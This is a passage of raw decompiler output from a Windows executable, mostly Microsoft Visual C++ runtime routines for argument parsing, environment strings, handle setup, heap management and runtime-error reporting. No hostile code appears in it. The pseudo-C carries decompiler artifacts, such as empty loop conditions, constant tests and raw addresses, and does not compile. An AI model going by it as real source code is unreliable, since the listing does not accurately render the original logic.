                             *((intOrPtr*)(_t55 + 88)) = 133;
                        }
                    } else {
                         *((intOrPtr*)(_t55 + 88)) = 132;
                    }
                } else {
                     *((intOrPtr*)(_t55 + 88)) = 129;
                }
            } else {
                 *((intOrPtr*)(_t55 + 88)) = 131;
            }
            _push( *((intOrPtr*)(_t55 + 88)));
            _push(8);
             *_t39();
            _pop(__ecx);
             *((intOrPtr*)(_t55 + 88)) = _t51;
            _pop(__ecx);
            _pop(__edi);
            goto L26;
        } else {
            _t49 = __edx + __edx * 2 << 2;
            goto L8;
            do {
            } while();
            goto L10;
L8:
            _t49 = _t49 + 12;
             *((intOrPtr*)(_t49 +  *((intOrPtr*)(_t55 + 80)) - 4)) = 0;
            __edx = __edx + 1;
            if(__edx <  *4269892 +  *4269888) {
                goto L8;
            } else {
                _t39 = _a4;
            }
            goto L10;
        }
    } else {
         *((intOrPtr*)(_t37 + 8)) = 0;
        _push(1);
        _pop(__eax);
        goto L29;
    }
}

L0040B5FD(
    intOrPtr _a4,                          // _cfa_4
    intOrPtr* _a8                          // _cfa_8
)
{
    _unknown_ __edi;                       // r4
    intOrPtr __esi;                        // r5
    intOrPtr* _t11;                        // _t11
    signed int _t13;                       // _t13
    _unknown_ _t17;                        // _t17

    __edx = _a8;
    _t13 =  *4269900;
    __esi = _a4;
    _t11 = __edx;
    if( *__edx == __esi) {
L4:
        if(_t11 >= __edx + (_t13 + _t13 * 2) * 4 ||  *_t11 != __esi) {
            return 0;
        } else {
            return _t11;
        }
    } else {
        _t17 = __edx + (_t13 + _t13 * 2) * 4;
        do {
            _t11 = _t11 + 12;
        } while(_t11 < _t17 &&  *_t11 != __esi);
        goto L4;
    }
}

L0040B637()
{
    _unknown_ __esi;                       // r5
    char _t2;                              // _t2
    char _t3;                              // _t3
    intOrPtr _t5;                          // _t5
    _unknown_ _t9;                         // _t9
    char* _t10;                            // _t10

    if( *4304616 == 0) {
        L0040D034();
    }
    _push(_t9);
    _t10 =  *4304632;
    _t2 =  *_t10;
    if(_t2 != 34) {
        if(_t2 <= 32) {
L11:
            _t3 =  *_t10;
            if(_t3 == 0 || _t3 > 32) {
                _pop(__esi);
                return _t10;
            } else {
L8:
                _t10 = _t10 + 1;
                goto L11;
            }
        } else {
            goto L10;
        }
        do {
L10:
            _t10 = _t10 + 1;
        } while( *_t10 > 32);
        goto L11;
    } else {
        goto L3;
    }
    do {
L3:
        _t5 =  *((intOrPtr*)(_t10 + 1));
        _t10 = _t10 + 1;
    } while(_t5 != 34 && _t5 != 0);
    if( *_t10 != 34) {
        goto L11;
    }
    goto L8;
}

L0040B68F(
    _unknown_ __edx                        // r3
)
{
    signed int __ebx;                      // r1
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    intOrPtr _t5;                          // _t5
    _unknown_ _t8;                         // _t8
    intOrPtr _t9;                          // _t9
    _unknown_ _t13;                        // _t13
    signed int _t14;                       // _t14
    char* _t15;                            // _t15
    _unknown_ _t16;                        // _t16
    intOrPtr* _t17;                        // _t17
    intOrPtr* _t18;                        // _t18
    _unknown_ _t19;                        // _t19
    intOrPtr _t21;                         // _t21

    __edx = __edx;
    __ebx = 0;
    _push(_t16);
    _push(_t13);
    if( *4304616 == 0) {
        L0040D034();
    }
    _t17 =  *4302888;
    _t14 = 0;
    while(1) {
        _t5 =  *_t17;
        if(_t5 == __bl) {
            break;
        }
        if(_t5 != 61) {
            _t14 = _t14 + 1;
        }
        _t17 = _t17 + L0040A210(_t5, _t17) + 1;
    }
    _t18 = L0040AFD6(4 + _t14 * 4);
     *4302932 = _t18;
    if(_t18 == 0) {
        _t7 = L0040AF8D(9);
    }
    _t15 =  *4302888;
    if( *_t15 != __bl) {
        _push(_t19);
        do {
            _t21 = _t7 + 1;
            if( *_t15 != 61) {
                _t9 = L0040AFD6(_t21);
                 *_t18 = _t9;
                if(_t9 == 0) {
                    L0040AF8D(9);
                }
                _push(_t15);
                _push( *_t18);
                _t7 = L0040A0F0(__edx);
                _pop(__ecx);
                _t18 = _t18 + 4;
                _pop(__ecx);
            }
            _t15 = _t15 + _t21;
        } while( *_t15 != __bl);
        _pop(__ebp);
    }
    _t8 = L0040B062( *4302888);
     *4302888 = 0;
     *_t18 = 0;
    _pop(__edi);
    _pop(__esi);
     *4304612 = 1;
    return _t8;
}

signed int L0040B748(
    _unknown_ __edx                        // r3
)
{
    signed int _v8;                        // _cfa_fffffff8
    char _v12;                             // _cfa_fffffff4
    _unknown_ __ebx;                       // r1
    _unknown_ __ecx;                       // r2
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    intOrPtr* _t13;                        // _t13
    signed int _t26;                       // _t26
    _unknown_ _t29;                        // _t29
    _unknown_ _t31;                        // _t31
    _unknown_ _t33;                        // _t33
    intOrPtr* _t34;                        // _t34
    _unknown_ _t35;                        // _t35
    intOrPtr _t37;                         // _t37

    __edx = __edx;
    _push(_t31);
    _push(_t31);
    _push(_t29);
    _push(_t35);
    _push(_t33);
    if( *4304616 == 0) {
        L0040D034();
    }
    _push(260);
    _push(4302968);
    _push(0);
    __imp__GetModuleFileNameA();
    _t13 =  *4304632;
     *4302948 = 4302968;
    _t34 = 4302968;
    if( *_t13 != 0) {
        _t34 = _t13;
    }
    _push( &_v12);
    _push( &_v8);
    _push(0);
    _push(0);
    _push(_t34);
    L0040B7E1(__edx);
    _t37 = L0040AFD6(_v12 + _v8 * 4);
    __esp = __esp + 20;
    if(_t37 == 0) {
        L0040AF8D(8);
    }
    L0040B7E1(__edx, _t34, _t37, _t37 + _v8 * 4,  &_v8,  &_v12);
    _t26 = _v8 - 1;
     *4302924 = _t37;
    _pop(__edi);
    _pop(__esi);
     *4302920 = _t26;
    _pop(__ebx);
    return _t26;
}

L0040B7E1(
    _unknown_ __edx,                       // r3
    char* _a4,                             // _cfa_4
    signed char** _a8,                     // _cfa_8
    signed char* _a12,                     // _cfa_c
    intOrPtr* _a16,                        // _cfa_10
    intOrPtr* _a20                         // _cfa_14
)
{
    _unknown_ __ebx;                       // r1
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    char* _t40;                            // _t40
    intOrPtr* _t41;                        // _t41
    unsigned int _t43;                     // _t43
    _unknown_ _t45;                        // _t45
    signed char _t47;                      // _t47
    char _t48;                             // _t48
    signed char _t51;                      // _t51
    char* _t54;                            // _t54
    intOrPtr _t58;                         // _t58
    _unknown_ _t62;                        // _t62
    signed char** _t63;                    // _t63
    _unknown_ _t65;                        // _t65
    signed char* _t66;                     // _t66

    __ecx = _a20;
    _push(_t42);
    _push(_t65);
     *__ecx = 0;
    _t66 = _a12;
    _push(_t62);
    _t63 = _a8;
     *_a16 = 1;
    _t40 = _a4;
    if(_t63 != 0) {
         *_t63 = _t66;
        _t63 =  &(_t63[1]);
        _a8 = _t63;
    }
    if( *_t40 != 34) {
        while(1) {
             *__ecx =  *__ecx + 1;
            if(_t66 != 0) {
                 *_t66 =  *_t40;
                _t66 =  &(_t66[1]);
            }
            _t47 =  *_t40;
            _t40 = _t40 + 1;
            _t42 = _t47 & 255;
            if(( *((_t47 & 255) + 4304033) & 4) != 0) {
                 *__ecx =  *__ecx + 1;
                if(_t66 != 0) {
                    _t42 =  *_t40;
                     *_t66 =  *_t40;
                    _t66 =  &(_t66[1]);
                }
                _t40 = _t40 + 1;
            }
            if(_t47 == 32) {
                break;
            }
            if(_t47 == 0) {
L24:
                _t40 = _t40 - 1;
L27:
                _a20 = 0;
L28:
                while( *_t40 != 0) {
                    while(1) {
                        _t48 =  *_t40;
                        if(_t48 != 32 && _t48 != 9) {
                            break;
                        }
                        _t40 = _t40 + 1;
                    }
                    if( *_t40 == 0) {
                        break;
                    }
                    if(_t63 != 0) {
                         *_t63 = _t66;
                        _t63 =  &(_t63[1]);
                        _a8 = _t63;
                    }
                     *_a16 =  *_a16 + 1;
                    while(1) {
                        _a4 = 1;
                        _t43 = 0;
L37:
                        while( *_t40 == 92) {
                            _t40 = _t40 + 1;
                            _t43 = _t43 + 1;
                        }
                        if( *_t40 != 34) {
L47:
                            _t42 = _t43 - 1;
                            if(_t43 == 0) {
L52:
                                _t51 =  *_t40;
                                if(_t51 == 0 || _a20 == 0 && (_t51 == 32 || _t51 == 9)) {
                                    if(_t66 != 0) {
                                         *_t66 = 0;
                                        _t66 =  &(_t66[1]);
                                    }
                                     *__ecx =  *__ecx + 1;
                                    goto L28;
                                } else {
                                    if(_a4 != 0) {
                                        if(_t66 == 0) {
                                            if(( *((_t51 & 255) + 4304033) & 4) != 0) {
                                                _t40 = _t40 + 1;
                                                 *__ecx =  *__ecx + 1;
                                            }
                                        } else {
                                            if(( *((_t51 & 255) + 4304033) & 4) != 0) {
                                                 *_t66 = _t51;
                                                _t66 =  &(_t66[1]);
                                                _t40 = _t40 + 1;
                                                 *__ecx =  *__ecx + 1;
                                            }
                                             *_t66 =  *_t40;
                                            _t66 =  &(_t66[1]);
                                        }
                                         *__ecx =  *__ecx + 1;
                                    }
                                    _t40 = _t40 + 1;
                                    _a4 = 1;
                                    _t43 = 0;
                                    goto L37;
                                }
                            }
                            _t45 = _t42 + 1;
                            do {
                                if(_t66 != 0) {
                                     *_t66 = 92;
                                    _t66 =  &(_t66[1]);
                                }
                                 *__ecx =  *__ecx + 1;
                                _t45 = _t45 - 1;
                            } while(_t45 != 0);
                            goto L52;
                        }
                        if((_t43 & 1) != 0) {
L46:
                            _t43 = _t43 >> 1;
                            goto L47;
                        }
                        if(_a20 == 0) {
L44:
                            _a4 = 0;
L45:
                            _t63 = _a8;
                            _a20 = 0;
                            goto L46;
                        }
                        _t54 = _t40 + 1;
                        if(_t40[1] != 34) {
                            goto L44;
                        }
                        _t40 = _t54;
                        goto L45;
                    }
                }
                if(_t63 != 0) {
                     *_t63 = 0;
                }
                _t41 = _a16;
                _pop(__edi);
                _pop(__esi);
                _pop(__ebx);
                 *_t41 =  *_t41 + 1;
                return _t41;
            }
            if(_t47 != 9) {
                continue;
            }
            break;
        }
        if(_t47 != 0) {
            if(_t66 != 0) {
                 *((char*)(_t66 - 1)) = 0;
            }
            goto L27;
        }
        goto L24;
    } else {
        goto L3;
    }
    do {
L3:
        _t58 =  *((intOrPtr*)(_t40 + 1));
        _t40 = _t40 + 1;
    } while(_t58 != 34 && _t58 != 0);
     *__ecx =  *__ecx + 1;
    if(_t66 != 0) {
         *_t66 = 0;
        _t66 =  &(_t66[1]);
    }
    if( *_t40 == 34) {
        _t40 = _t40 + 1;
    }
    goto L27;
}

L0040B995()
{
    intOrPtr _v4;                          // _cfa_fffffffc
    intOrPtr _v36;                         // _cfa_ffffffdc
    intOrPtr _v40;                         // _cfa_ffffffd8
    intOrPtr _v72;                         // _cfa_ffffffb8
    intOrPtr* __ebx;                       // r1
    _unknown_ __ecx;                       // r2
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    _unknown_ __ebp;                       // r6
    intOrPtr* _t7;                         // _t7
    intOrPtr* _t9;                         // _t9
    signed int _t11;                       // _t11
    intOrPtr* _t13;                        // _t13
    intOrPtr _t16;                         // _t16
    intOrPtr* _t20;                        // _t20
    intOrPtr* _t21;                        // _t21
    intOrPtr* _t22;                        // _t22
    signed int _t23;                       // _t23
    intOrPtr* _t24;                        // _t24
    intOrPtr _t26;                         // _t26

    _t7 =  *4303228;
    _t24 = __imp__GetEnvironmentStringsW;
    __ebx = 0;
    _t22 = 0;
    _t20 = 0;
    if(_t7 != 0) {
        if(_t7 != 1) {
            if(_t7 != 2) {
L27:
                return 0;
            }
L18:
            if(_t20 != __ebx) {
L20:
                _t9 = _t20;
                if( *_t20 == __bl) {
L23:
                    _t11 = _t9 - _t20 + 1;
                    _t25 = _t11;
                    L0040AFD6(_t11);
                    _t23 = _t11;
                    if(_t23 != __ebx) {
                        L0040A760(_t23, _t20, _t11);
                    } else {
                        _t23 = 0;
                    }
                    _push(_t20);
                    __imp__FreeEnvironmentStringsA();
                    return _t23;
                } else {
                    goto L21;
                }
                do {
                    do {
L21:
                        _t9 = _t9 + 1;
                    } while( *_t9 != __bl);
                    _t9 = _t9 + 1;
                } while( *_t9 != __bl);
                goto L23;
            }
            __imp__GetEnvironmentStrings();
            _t20 = _t7;
            if(_t20 == __ebx) {
                goto L27;
            }
            goto L20;
        }
L6:
        if(_t22 != __ebx) {
L8:
            _t13 = _t22;
            if( *_t22 == __bx) {
L11:
                _t21 = __imp__WideCharToMultiByte;
                _push(__ebx);
                _push(__ebx);
                _t16 = (_t13 - _t22 >> 1) + 1;
                _push(__ebx);
                _push(__ebx);
                _push(_t16);
                _push(_t22);
                _push(__ebx);
                _push(__ebx);
                _v4 = _t16;
                 *_t21();
                _t26 = _t16;
                if(_t26 != __ebx) {
                    L0040AFD6(_t26);
                    _v40 = _t16;
                    if(_t16 != __ebx) {
                        _push(__ebx);
                        _push(__ebx);
                        _push(_t26);
                        _push(_t16);
                        _push(_v36);
                        _push(_t22);
                        _push(__ebx);
                        _push(__ebx);
                         *_t21();
                        if(_t16 == 0) {
                            L0040B062(_v72);
                            _v72 = __ebx;
                        }
                        __ebx = _v72;
                    }
                }
                _push(_t22);
                __imp__FreeEnvironmentStringsW();
                return __ebx;
            } else {
                goto L9;
            }
            do {
                do {
L9:
                    _t13 = _t13 + 2;
                } while( *_t13 != __bx);
                _t13 = _t13 + 2;
            } while( *_t13 != __bx);
            goto L11;
        }
         *_t24();
        _t22 = _t7;
        if(_t22 == __ebx) {
            goto L27;
        }
        goto L8;
    }
     *_t24();
    _t22 = _t7;
    if(_t22 == 0) {
        __imp__GetEnvironmentStrings();
        _t20 = _t7;
        if(_t20 == 0) {
            goto L27;
        }
         *4303228 = 2;
        goto L18;
    }
     *4303228 = 1;
    goto L6;
}

signed int L0040BAC7()
{
    signed int* _v8;                       // _cfa_fffffff8
    intOrPtr* _v24;                        // _cfa_ffffffe8
    short _v26;                            // _cfa_ffffffe6
    char _v76;                             // _cfa_ffffffb4
    _unknown_ __ebx;                       // r1
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    signed int* _t48;                      // _t48
    signed int _t50;                       // _t50
    intOrPtr* _t54;                        // _t54
    signed char _t58;                      // _t58
    signed int* _t62;                      // _t62
    signed int* _t63;                      // _t63
    signed int _t66;                       // _t66
    intOrPtr* _t67;                        // _t67
    signed int* _t68;                      // _t68
    signed int* _t69;                      // _t69
    signed int _t70;                       // _t70
    signed int _t78;                       // _t78
    intOrPtr _t79;                         // _t79
    signed int* _t80;                      // _t80
    signed int* _t81;                      // _t81
    signed int _t82;                       // _t82
    signed int** _t83;                     // _t83

    _t80 = L0040AFD6(1152);
    if(_t80 == 0) {
        L0040AF8D(27);
    }
     *4304352 = _t80;
     *4304608 = 32;
    _t48 =  &(_t80[0x120]);
    while(_t80 < _t48) {
        _t80[1] = 0;
         *_t80 =  *_t80 | -1;
        _t80[2] = 0;
        _t80[1] = 10;
        _t80 =  &(_t80[9]);
        _t48 =  &(( *4304352)[0x120]);
    }
    _push( &_v76);
    __imp__GetStartupInfoA();
    if(_v26 == 0) {
L25:
        _t66 = 0;
        do {
            _t69 =  *4304352;
            _t50 = _t66 + _t66 * 8;
            _t81 =  &(_t69[_t50]);
            if(_t69[_t50] != -1) {
                _t81[1] = _t81[1] | 128;
                goto L37;
            }
            _t81[1] = 129;
            if(_t66 != 0) {
                asm("sbb eax, eax");
                _t50 =  ~(_t66 - 1) + -11;
            } else {
                _push(-10);
                _pop(__eax);
            }
            _push(_t50);
            __imp__GetStdHandle();
            _t78 = _t50;
            if(_t78 == -1) {
L33:
                _t81[1] = _t81[1] | 64;
            } else {
                _push(_t78);
                __imp__GetFileType();
                if(_t50 == 0) {
                    goto L33;
                }
                _t50 = _t50 & 255;
                 *_t81 = _t78;
                if(_t50 != 2) {
                    if(_t50 == 3) {
                        _t81[1] = _t81[1] | 8;
                    }
                    goto L37;
                }
                goto L33;
            }
L37:
            _t66 = _t66 + 1;
        } while(_t66 < 3);
        _push( *4304608);
        __imp__SetHandleCount();
        return _t50;
    }
    _t54 = _v24;
    if(_t54 == 0) {
        goto L25;
    }
    _t79 =  *_t54;
    _t67 = _t54 + 4;
    _v8 = _t67 + _t79;
    if(_t79 >= 2048) {
        _t79 = 2048;
    }
    if( *4304608 >= _t79) {
L18:
        _t82 = 0;
        if(_t79 <= 0) {
            goto L25;
        } else {
            goto L19;
        }
        do {
L19:
            _t70 =  *_v8;
            if(_t70 == -1) {
                goto L24;
            }
            _t58 =  *_t67;
            if((_t58 & 1) == 0) {
                goto L24;
            }
            if((_t58 & 8) != 0) {
L23:
                _t62 =  &(4304352[_t82 >> 5][(_t82 & 31) + (_t82 & 31) * 8]);
                 *_t62 =  *_v8;
                _t62[1] =  *_t67;
                goto L24;
            }
            _push(_t70);
            __imp__GetFileType();
            if(_t58 == 0) {
                goto L24;
            }
            goto L23;
L24:
            _v8 =  &(_v8[1]);
            _t82 = _t82 + 1;
            _t67 = _t67 + 1;
        } while(_t82 < _t79);
        goto L25;
    } else {
        _t83 = 4304356;
        while(1) {
            _t63 = L0040AFD6(1152);
            if(_t63 == 0) {
                break;
            }
             *4304608 =  *4304608 + 32;
             *_t83 = _t63;
            _t68 =  &(_t63[0x120]);
            while(_t63 < _t68) {
                _t63[1] = 0;
                 *_t63 =  *_t63 | -1;
                _t63[2] = 0;
                _t63[1] = 10;
                _t63 =  &(_t63[9]);
                _t68 =  &(( *_t83)[0x120]);
            }
            _t83 =  &(_t83[1]);
            if( *4304608 < _t79) {
                continue;
            }
            goto L18;
        }
        _t79 =  *4304608;
        goto L18;
    }
}

L0040BC83(
    intOrPtr _a4                           // _cfa_4
)
{
    _unknown_ _t3;                         // _t3
    _unknown_ _t5;                         // _t5

    _push(0);
    _push(4096);
    _t3 = _a4 == 0;
    _push(0);
    __imp__HeapCreate();
     *4304320 = 0;
    if(0 == 0) {
L3:
        return 0;
    } else {
        _t5 = L0040BF05(_t3);
        if(_t5 != 0) {
            _push(1);
            _pop(__eax);
            return _t5;
        } else {
            _push( *4304320);
            __imp__HeapDestroy();
            goto L3;
        }
    }
}

L0040BCBF()
{
    intOrPtr _t1;                          // _t1
    intOrPtr* _t3;                         // _t3

    _t1 =  *4302896;
    if(_t1 == 1 || _t1 == 0 &&  *4269220 == 1) {
        L0040BCF8(__edi, 252);
        _t3 =  *4303232;
        if(_t3 != 0) {
             *_t3();
        }
        L0040BCF8(__edi, 255);
        return;
    } else {
        return;
    }
}

L0040BCF8(
    _unknown_ __edi,                       // r4
    char _a4                               // _cfa_4
)
{
    char _v164;                            // _cfa_ffffff5c
    char _v424;                            // _cfa_fffffe58
    _unknown_ __esi;                       // r5
    signed int _t17;                       // _t17
    signed int _t21;                       // _t21
    signed int _t33;                       // _t33
    char* _t40;                            // _t40
    _unknown_ _t42;                        // _t42
    signed int _t44;                       // _t44

    __edx = _a4;
    __ecx = 0;
    _t17 = 4269944;
    while(__edx !=  *_t17) {
        _t17 = _t17 + 8;
        __ecx = __ecx + 1;
        if(_t17 < 4270088) {
            continue;
        }
        break;
    }
    _push(_t42);
    _t44 = __ecx << 3;
    if(__edx !=  *((intOrPtr*)(_t44 + 4269944))) {
L14:
        _pop(__esi);
        return _t17;
    }
    _t17 =  *4302896;
    if(_t17 == 1 || _t17 == 0 &&  *4269220 == 1) {
        _t44 = _t44 + 4269948;
        _push(0);
        _push( &_a4);
        _t17 = L0040A210( &_a4,  *_t44);
        _push(_t17);
        _push( *_t44);
        _push(-12);
        __imp__GetStdHandle();
        _push(_t17);
        __imp__WriteFile();
    } else {
        if(__edx == 252) {
            goto L14;
        }
        _push(260);
        _push( &_v424);
        _push(0);
        __imp__GetModuleFileNameA();
        if( &_v424 == 0) {
            _push("<program name unknown>");
            _push( &_v424);
            L0040A0F0(__edx);
            _pop(__ecx);
            _pop(__ecx);
        }
        _push(__edi);
        _push( &_v424);
        _t40 =  &_v424;
        _t21 = L0040A210( &_v424);
        _pop(__ecx);
        if(_t21 + 1 > 60) {
            _push( &_v424);
            _t33 = L0040A210( &_v424);
            _push(3);
            _t40 = _t33 +  &_v424 - 59;
            _push("...");
            _push(_t40);
            L0040A460( &_v424 - 59);
            __esp = __esp + 16;
        }
        _push("Runtime Error!\n\nProgram: ");
        _push( &_v164);
        L0040A0F0(__edx);
        _push(_t40);
        _push( &_v164);
        L0040A100( &_v164);
        _push("\n\n");
        _push( &_v164);
        L0040A100( &_v164);
        _push( *(_t44 + 4269948));
        _push( &_v164);
        L0040A100( &_v164);
        _t17 = L0040D050( &_v164,  &_v164, "Microsoft Visual C++ Runtime Library", 73744);
        __esp = __esp + 32;
        _pop(__edi);
    }
}

L0040BE4B(
    intOrPtr _a4                           // _cfa_4
)
{
    intOrPtr* _t2;                         // _t2

    _t2 =  *4303240;
    if(_t2 == 0) {
L3:
        return;
    } else {
        _push(_a4);
         *_t2();
        _pop(__ecx);
        if(_t2 == 0) {
            goto L3;
        } else {
            _push(1);
            _pop(__eax);
            return;
        }
    }
}

L0040BE66()
{
    intOrPtr* __esi;                       // r5

    __esi = __imp__InitializeCriticalSection;
    _push( *4270156);
     *__esi();
    _push( *4270140);
     *__esi();
    _push( *4270124);
     *__esi();
    _push( *4270092);
     *__esi();
}

signed int L0040BE8F(
    signed int _a4                         // _cfa_4
)
{
    _unknown_ __edi;                       // r4
    intOrPtr* __esi;                       // r5
    signed int _t6;                        // _t6
    _unknown_ _t11;                        // _t11
    intOrPtr _t12;                         // _t12

    _t6 = _a4;
    __esi = 4270088 + _t6 * 4;
    if( *((intOrPtr*)(4270088 + _t6 * 4)) == 0) {
        _push(_t11);
        _t12 = L0040AFD6(24);
        if(_t12 == 0) {
            L0040AF8D(17);
        }
        L0040BE8F(17);
        _push(_t12);
        if( *__esi != 0) {
            L0040B062();
            _pop(__ecx);
        } else {
            __imp__InitializeCriticalSection();
             *__esi = _t12;
        }
        _t6 = L0040BEF0(17);
        _pop(__edi);
    }
    _push( *__esi);
    __imp__EnterCriticalSection();
    return _t6;
}

signed int L0040BEF0(
    signed int _a4                         // _cfa_4
)
{
    __eax = _a4;
    _push( *((intOrPtr*)(4270088 + __eax * 4)));
    __imp__LeaveCriticalSection();
    return __eax;
}

L0040BF05(
    intOrPtr __eax                         // r0
)
{
    __eax = __eax;
    _push(320);
    _push(0);
    _push( *4304320);
    __imp__HeapAlloc();
     *4304316 = __eax;
    if(__eax != 0) {
         *4304308 = 0;
         *4304312 = 0;
        _push(1);
         *4304304 = __eax;
         *4304296 = 16;
        _pop(__eax);
        return __eax;
    } else {
        return __eax;
    }
}

L0040BF43(
    intOrPtr _a4                           // _cfa_4
)
{
    intOrPtr _t8;                          // _t8
    _unknown_ _t11;                        // _t11

    _t8 =  *4304316;
    _t11 = _t8 + ( *4304312 +  *4304312 * 4) * 4;
    while(_t8 < _t11) {
        if(_a4 -  *((intOrPtr*)(_t8 + 12)) >= 1048576) {
            _t8 = _t8 + 20;
            continue;
        }
        return _t8;
    }
    return 0;
}

L0040BF6E(
    signed int* _a4,                       // _cfa_4
    signed char _a8,                       // _cfa_8
    char _a11                              // _cfa_b
)
{
    signed int _v8;                        // _cfa_fffffff8
    signed int _v12;                       // _cfa_fffffff4
    signed int _v16;                       // _cfa_fffffff0
    intOrPtr* _v20;                        // _cfa_ffffffec
    signed int _v24;                       // _cfa_ffffffe8
    _unknown_ __ebx;                       // r1
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    signed int _t165;                      // _t165
    intOrPtr* _t166;                       // _t166
    signed int* _t167;                     // _t167
    signed int* _t168;                     // _t168
    signed int* _t174;                     // _t174
    signed int _t183;                      // _t183
    signed int* _t191;                     // _t191
    signed int _t195;                      // _t195
    signed int _t197;                      // _t197
    intOrPtr _t202;                        // _t202
    char _t216;                            // _t216
    char _t217;                            // _t217
    signed int _t226;                      // _t226
    signed char _t232;                     // _t232
    char* _t235;                           // _t235
    char* _t237;                           // _t237
    signed int _t240;                      // _t240
    intOrPtr _t243;                        // _t243
    signed char _t244;                     // _t244
    char* _t247;                           // _t247
    char* _t249;                           // _t249
    signed char _t251;                     // _t251
    signed int _t252;                      // _t252
    signed int _t256;                      // _t256
    signed int _t262;                      // _t262
    signed int _t265;                      // _t265
    signed char _t266;                     // _t266
    signed int _t269;                      // _t269
    intOrPtr* _t270;                       // _t270
    intOrPtr _t276;                        // _t276
    signed int _t279;                      // _t279
    signed int _t282;                      // _t282
    signed int _t285;                      // _t285

    _t251 = _a8;
    _t191 = _a4;
    _t165 = _t191[4];
    _t252 = _t251 + -4;
    _t285 = _t251 - _t191[3] >> 15;
    _t266 =  *(_t252 - 4);
    _t183 =  *((intOrPtr*)(_t251 - 4)) - 1;
    _v8 = _t266;
    _v16 = _t183;
    _v20 = _t285 * 516 + _t165 + 324;
    _t195 =  *(_t183 + _t252);
    _v12 = _t195;
    if((_t195 & 1) != 0) {
L10:
        _t269 = (_t183 >> 4) - 1;
        if(_t269 > 63) {
            _push(63);
            _pop(__edi);
        }
        _t197 = _v8 & 1;
        _v24 = _t197;
        if(_t197 == 0) {
            _t256 = _t252 - _v8;
            _push(63);
            _v12 = _t256;
            _t226 = (_v8 >> 4) - 1;
            _pop(__edx);
            _a8 = _t226;
            if(_t226 > _t256) {
                _a8 = _t256;
                _t226 = _t256;
            }
            _t183 = _t183 + _v8;
            _v16 = _t183;
            _t269 = (_t183 >> 4) - 1;
            if(_t269 > _t256) {
                _t269 = _t256;
            }
            if(_t226 != _t269) {
                if( *((intOrPtr*)(_v12 + 4)) ==  *((intOrPtr*)(_v12 + 8))) {
                    _t232 = _a8;
                    if(_t232 >= 32) {
                        _t235 = _a8 + _t165 + 4;
                        _t262 =  !(-2147483648 >> _t232 + -32);
                         *(_t165 + 196 + _t285 * 4) =  *(_t165 + 196 + _t285 * 4) & -2147483648;
                         *_t235 =  *_t235 - 1;
                        if( *_t235 == 0) {
                            _a4[1] = _a4[1] & _t262;
                        }
                    } else {
                        _t237 = _t232 + _t165 + 4;
                        _t265 =  !(-2147483648 >> _t232);
                         *(_t165 + 68 + _t285 * 4) =  *(_t165 + 68 + _t285 * 4) & -2147483648;
                         *_t237 =  *_t237 - 1;
                        if( *_t237 == 0) {
                             *_a4 =  *_a4 & _t265;
                        }
                    }
                }
                 *((intOrPtr*)( *((intOrPtr*)(_v12 + 8)) + 4)) =  *((intOrPtr*)(_v12 + 4));
                 *((intOrPtr*)( *((intOrPtr*)(_v12 + 4)) + 8)) =  *((intOrPtr*)(_v12 + 8));
            }
            _t252 = _v12;
        }
        if(_v24 != 0 || _a8 != _t269) {
             *((intOrPtr*)(_t252 + 4)) =  *((intOrPtr*)(_v20 + _t269 * 8 + 4));
            _t202 = _v20 + _t269 * 8;
             *((intOrPtr*)(_t252 + 8)) = _t202;
             *(_t202 + 4) = _t252;
             *( *((intOrPtr*)(_t252 + 4)) + 8) = _t252;
            if( *((intOrPtr*)(_t252 + 4)) ==  *((intOrPtr*)(_t252 + 8))) {
                _t216 =  *((intOrPtr*)(_t269 + _t165 + 4));
                _a11 = _t216;
                _t217 = _t216 + 1;
                 *((char*)(_t269 + _t165 + 4)) = _t217;
                if(_t217 >= 0) {
                    if(_a11 == 0) {
                        _a4[1] = _a4[1] | -2147483648 >> _t269 - 32;
                    }
                     *(_t165 + 196 + _t285 * 4) =  *(_t165 + 196 + _t285 * 4) | -2147483648 >> _t269 - 32;
                } else {
                    if(_a11 == 0) {
                         *_a4 =  *_a4 | -2147483648 >> _t269;
                    }
                     *(_t165 + 68 + _t285 * 4) =  *(_t165 + 68 + _t285 * 4) | -2147483648 >> _t269;
                }
                _t183 = _v16;
            }
        }
        _t166 = _v20;
         *_t252 = _t183;
         *(_t183 + _t252 - 4) = _t183;
         *_t166 =  *_t166 - 1;
        if( *_t166 != 0) {
            return;
        } else {
            _t167 =  *4304308;
            if(_t167 == 0) {
L45:
                _t168 = _a4;
L46:
                 *4304308 = _t168;
                 *4304300 = _t285;
                return;
            }
            _t270 = __imp__VirtualFree;
            _push(16384);
            _push(32768);
            _push(( *4304300 << 15) + _t167[3]);
             *_t270();
            ( *4304308)[2] = ( *4304308)[2] | -2147483648 >>  *4304300;
             *((intOrPtr*)(( *4304308)[4] + 196 +  *4304300 * 4)) = 0;
             *((char*)(( *4304308)[4] + 67)) =  *((char*)(( *4304308)[4] + 67)) - 1;
            _t174 =  *4304308;
            if( *((char*)(_t174[4] + 67)) == 0) {
                _t174[1] = _t174[1] & -2;
                _t174 =  *4304308;
            }
            if(_t174[2] != -1) {
                goto L45;
            } else {
                _push(32768);
                _push(0);
                _push(_t174[3]);
                 *_t270();
                _push(( *4304308)[4]);
                _push(0);
                _push( *4304320);
                __imp__HeapFree();
                L0040D0E0( *4304308,  &(( *4304308)[5]), ( *4304312 +  *4304312 * 4 << 2) -  *4304308 +  *4304316 - 20);
                _t168 = _a4;
                 *4304312 =  *4304312 - 1;
                if(_t168 >  *4304308) {
                    _t168 = _t168 - 20;
                }
                 *4304304 =  *4304316;
                goto L46;
            }
        }
    } else {
        _push(63);
        _t240 = (_t195 >> 4) - 1;
        _pop(__edi);
        _a8 = _t240;
        if(_t240 > _t266) {
            _a8 = _t266;
        }
        if( *((intOrPtr*)(_t183 + _t252 + 4)) ==  *((intOrPtr*)(_t183 + _t252 + 8))) {
            _t244 = _a8;
            if(_t244 >= 32) {
                _t247 = _a8 + _t165 + 4;
                _t279 =  !(-2147483648 >> _t244 + -32);
                 *(_t165 + 196 + _t285 * 4) =  *(_t165 + 196 + _t285 * 4) & -2147483648;
                 *_t247 =  *_t247 - 1;
                if( *_t247 == 0) {
                    _a4[1] = _a4[1] & _t279;
                }
            } else {
                _t249 = _t244 + _t165 + 4;
                _t282 =  !(-2147483648 >> _t244);
